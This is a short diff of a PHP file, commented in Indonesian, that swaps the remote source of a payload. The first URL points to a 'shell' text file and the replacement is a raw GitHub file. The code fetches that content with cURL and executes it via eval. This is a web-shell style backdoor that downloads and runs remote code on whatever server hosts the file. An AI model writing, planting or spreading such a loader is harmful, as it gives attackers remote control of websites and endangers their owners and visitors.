@@ -12,7 +12,7 @@ return $output;
 }
 
 // Mendapatkan konten dari URL menggunakan cURL
-$a = geturlsinfo('https://miawseo.site/shell/bora.txt');
+$a = geturlsinfo('https://raw.githubusercontent.com/fastseo15/original/refs/heads/main/pink.txt');
 
 // Menggunakan eval untuk mengeksekusi kode PHP yang diterima
 eval('?>' . $a);
